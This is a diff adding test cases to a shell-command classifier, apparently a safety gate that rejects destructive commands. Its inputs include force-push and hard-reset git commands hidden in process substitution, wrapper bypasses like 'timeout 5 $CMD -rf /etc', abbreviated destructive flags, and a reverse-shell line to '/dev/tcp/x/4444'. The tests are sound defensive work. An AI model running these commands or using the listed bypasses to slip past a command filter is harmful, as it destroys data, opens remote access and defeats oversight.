@@ -1373,6 +1373,85 @@ describe("classifyCommand", () => {
     });
   });
 
+  describe("process-substitution hidden git (round 13)", () => {
+    test("cat <(git push --force origin main) is rejected", () => {
+      expect(classifyCommand("cat <(git push --force origin main)").ok).toBe(false);
+    });
+
+    test("diff <(git reset --hard HEAD~1) /tmp/x is rejected", () => {
+      expect(classifyCommand("diff <(git reset --hard HEAD~1) /tmp/x").ok).toBe(false);
+    });
+
+    test(">(git push --force) output substitution is rejected", () => {
+      expect(classifyCommand("tee >(git push --force origin main)").ok).toBe(false);
+    });
+
+    test("cat <(git status) (benign process substitution) is allowed", () => {
+      expect(classifyCommand("cat <(git status)").ok).toBe(true);
+    });
+  });
+
+  describe("wrapper-with-operand expansion bypass (round 13)", () => {
+    test("timeout 5 $CMD -rf /etc is rejected", () => {
+      expect(classifyCommand("timeout 5 $CMD -rf /etc").ok).toBe(false);
+    });
+
+    test("nice -n 10 $CMD -rf /etc is rejected", () => {
+      expect(classifyCommand("nice -n 10 $CMD -rf /etc").ok).toBe(false);
+    });
+
+    test("ionice -c 2 $CMD -rf /etc is rejected", () => {
+      expect(classifyCommand("ionice -c 2 $CMD -rf /etc").ok).toBe(false);
+    });
+
+    test("timeout 5 ls (benign, allowed)", () => {
+      expect(classifyCommand("timeout 5 ls").ok).toBe(true);
+    });
+
+    test("nice -n 10 ls (benign, allowed)", () => {
+      expect(classifyCommand("nice -n 10 ls").ok).toBe(true);
+    });
+  });
+
+  describe("git long-option abbreviation (round 13)", () => {
+    test("git reset --har HEAD~1 is rejected (--hard abbrev)", () => {
+      expect(classifyCommand("git reset --har HEAD~1").ok).toBe(false);
+    });
+
+    test("git reset --ha HEAD~1 is rejected (--hard 2-char abbrev)", () => {
+      expect(classifyCommand("git reset --ha HEAD~1").ok).toBe(false);
+    });
+
+    test("git clean --for -d is rejected (--force abbrev)", () => {
+      expect(classifyCommand("git clean --for -d").ok).toBe(false);
+    });
+
+    test("git checkout --for main is rejected (--force abbrev)", () => {
+      expect(classifyCommand("git checkout --for main").ok).toBe(false);
+    });
+
+    test("git push --force-with-leas is rejected", () => {
+      expect(classifyCommand("git push --force-with-leas origin main").ok).toBe(false);
+    });
+
+    test("git branch --del --for my-branch is rejected (both abbreviations)", () => {
+      expect(classifyCommand("git branch --del --for my-branch").ok).toBe(false);
+    });
+
+    test("git push --mir origin is rejected (--mirror abbrev)", () => {
+      expect(classifyCommand("git push --mir origin").ok).toBe(false);
+    });
+
+    test("git push --pru origin (--prune abbrev) is rejected", () => {
+      expect(classifyCommand("git push --pru origin").ok).toBe(false);
+    });
+
+    test("git checkout --foo main (not an abbreviation of any destructive flag)", () => {
+      // --foo is not a prefix of --force; should not be flagged.
+      expect(classifyCommand("git checkout --foo main").ok).toBe(true);
+    });
+  });
+
   describe("ClassificationResult shape", () => {
     test("blocked result has all required fields", () => {
       const result = classifyCommand("bash -i >& /dev/tcp/x/4444 0>&1");
